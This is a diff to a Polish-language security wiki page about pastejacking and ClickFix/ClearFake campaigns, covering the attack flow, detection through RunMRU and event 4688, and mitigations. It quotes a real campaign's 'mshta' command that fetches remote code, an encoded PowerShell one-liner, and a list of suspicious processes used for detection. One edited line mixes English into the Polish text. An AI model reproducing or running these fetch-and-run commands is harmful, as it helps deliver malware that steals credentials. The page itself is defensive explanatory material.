@@ -6,7 +6,7 @@
 
 ## Przegląd
 
-Przechwytywanie schowka – znane również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzania. Złośliwa strona internetowa (lub jakikolwiek kontekst obsługujący JavaScript, taki jak aplikacja Electron lub Desktop) programowo umieszcza tekst kontrolowany przez atakującego w systemowym schowku. Ofiary są zachęcane, zazwyczaj przez starannie opracowane instrukcje inżynierii społecznej, do naciśnięcia **Win + R** (okno uruchamiania), **Win + X** (Szybki dostęp / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.
+Przechwytywanie schowka – znane również jako *pastejacking* – wykorzystuje fakt, że użytkownicy rutynowo kopiują i wklejają polecenia bez ich sprawdzania. Złośliwa strona internetowa (lub jakiekolwiek środowisko obsługujące JavaScript, takie jak aplikacja Electron lub Desktop) programowo umieszcza tekst kontrolowany przez atakującego w systemowym schowku. Ofiary są zachęcane, zazwyczaj przez starannie opracowane instrukcje inżynierii społecznej, do naciśnięcia **Win + R** (okno uruchamiania), **Win + X** (Szybki dostęp / PowerShell) lub otwarcia terminala i *wklejenia* zawartości schowka, co natychmiast wykonuje dowolne polecenia.
 
 Ponieważ **żaden plik nie jest pobierany i żaden załącznik nie jest otwierany**, technika ta omija większość zabezpieczeń e-mailowych i webowych, które monitorują załączniki, makra lub bezpośrednie wykonanie poleceń. Atak jest zatem popularny w kampaniach phishingowych dostarczających powszechne rodziny złośliwego oprogramowania, takie jak NetSupport RAT, Latrodectus loader czy Lumma Stealer.
 
@@ -26,9 +26,9 @@ Starsze kampanie używały `document.execCommand('copy')`, nowsze polegają na a
 
 ## Przepływ ClickFix / ClearFake
 
-1. Użytkownik odwiedza stronę z błędami w nazwie lub skompromitowaną stronę (np. `docusign.sa[.]com`)
-2. Wstrzyknięty JavaScript **ClearFake** wywołuje pomocniczą funkcję `unsecuredCopyToClipboard()`, która cicho przechowuje zakodowany w Base64 skrypt PowerShell w schowku.
-3. Instrukcje HTML informują ofiarę: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
+1. Użytkownik odwiedza stronę z błędami w nazwie lub skompromitowaną (np. `docusign.sa[.]com`)
+2. Wstrzyknięty **ClearFake** JavaScript wywołuje pomocniczą funkcję `unsecuredCopyToClipboard()`, która cicho przechowuje zakodowany w Base64 skrypt PowerShell w schowku.
+3. Instrukcje HTML informują ofiarę, aby: *„Naciśnij **Win + R**, wklej polecenie i naciśnij Enter, aby rozwiązać problem.”*
 4. `powershell.exe` wykonuje, pobierając archiwum, które zawiera legalny plik wykonywalny oraz złośliwy DLL (klasyczne sideloading DLL).
 5. Loader deszyfruje dodatkowe etapy, wstrzykuje shellcode i instaluje persistencję (np. zaplanowane zadanie) – ostatecznie uruchamiając NetSupport RAT / Latrodectus / Lumma Stealer.
 
@@ -55,13 +55,13 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-**mshta** wywołuje ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wyodrębnia `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` za pomocą `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który exfiltruje dane logowania przeglądarki do `sumeriavgv.digital`.
+The **mshta** call uruchamia ukryty skrypt PowerShell, który pobiera `PartyContinued.exe`, wyodrębnia `Boat.pst` (CAB), rekonstruuje `AutoIt3.exe` za pomocą `extrac32` i konkatenacji plików, a na końcu uruchamia skrypt `.a3x`, który exfiltruje dane logowania przeglądarki do `sumeriavgv.digital`.
 
 ## Wykrywanie i Polowanie
 
-Zespoły niebieskie mogą połączyć dane telemetryczne z schowka, tworzenia procesów i rejestru, aby zlokalizować nadużycia pastejacking:
+Zespoły niebieskie mogą łączyć dane telemetryczne z schowka, tworzenia procesów i rejestru, aby zlokalizować nadużycia pastejacking:
 
-* Rejestr systemu Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / obfuscowanych.
+* Rejestr systemu Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` przechowuje historię poleceń **Win + R** – szukaj nietypowych wpisów Base64 / obfuskowanych.
 * Identyfikator zdarzenia bezpieczeństwa **4688** (Tworzenie procesu), gdzie `ParentImage` == `explorer.exe` i `NewProcessName` w { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
 * Identyfikator zdarzenia **4663** dla tworzenia plików w `%LocalAppData%\Microsoft\Windows\WinX\` lub folderach tymczasowych tuż przed podejrzanym zdarzeniem 4688.
 * Czujniki schowka EDR (jeśli są obecne) – skoreluj `Clipboard Write` natychmiast po nowym procesie PowerShell.
@@ -69,13 +69,14 @@ Zespoły niebieskie mogą połączyć dane telemetryczne z schowka, tworzenia pr
 ## Łagodzenia
 
 1. Wzmocnienie przeglądarki – wyłącz dostęp do zapisu w schowku (`dom.events.asyncClipboard.clipboardItem` itp.) lub wymagaj gestu użytkownika.
-2. Świadomość bezpieczeństwa – ucz użytkowników, aby *wpisywali* wrażliwe polecenia lub wklejali je najpierw do edytora tekstu.
+2. Świadomość bezpieczeństwa – ucz użytkowników, aby *pisali* wrażliwe polecenia lub wklejali je najpierw do edytora tekstu.
 3. Tryb ograniczonego języka PowerShell / Polityka wykonania + Kontrola aplikacji, aby zablokować dowolne jednowierszowe polecenia.
 4. Kontrole sieciowe – zablokuj wychodzące żądania do znanych domen pastejacking i C2 złośliwego oprogramowania.
 
 ## Powiązane Sztuczki
 
-* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników na złośliwy serwer:
+* **Discord Invite Hijacking** często nadużywa tego samego podejścia ClickFix po zwabieniu użytkowników do złośliwego serwera:
+
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
